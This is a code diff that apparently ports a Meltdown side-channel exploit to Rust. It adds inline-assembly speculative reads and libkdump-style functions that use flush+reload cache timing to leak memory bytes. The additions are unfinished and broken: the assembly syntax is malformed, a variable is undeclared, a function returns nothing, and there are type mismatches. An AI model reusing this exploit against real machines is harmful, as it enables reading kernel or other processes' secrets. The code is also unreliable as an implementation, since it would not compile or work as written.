@@ -14,6 +14,8 @@ pub fn meltdown_fast(pointer: *const u128) {
             "mov {tmp} [{x}]",
             "shl 12, {tmp}",
             "mov {tmp2} [{base}+{tmp}]",
+            x = in(reg) pointer,
+            tmp = out(reg) _,
         );
     }
 }
@@ -61,6 +63,32 @@ pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
     flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
     
     end_time - start_time < cache_miss_threshold
+}
+
+pub fn libkdump_read_signal_handler(retries: u32, mem: [u128], pointer: *const u128) -> u32 {
+	for _ in 0..retries {
+		// TODO: Set segmentation fault callback position
+		meltdown_fast(pointer);
+	}
+	
+}
+
+pub fn libkdump_read(measurements: u32, retries: u32, mem: [u128], accept_after: u32, pointer: *const u128) -> u32 {
+	const ARRAY_SIZE: usize = 256;
+	let res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
+	
+	for _ in 0..measurements {
+		// TODO: Add implementation using TSX?
+		r = libkdump_read_signal_handler(retries, mem, pointer);
+		res_stat[r] += 1;
+	}
+	
+	let max_i = res_stat.iter().max();
+	if max_i > accept_after {
+		max_i
+	} else {
+		0
+	}
 }
 
 pub fn detect_flush_reload_threshold() -> u64{
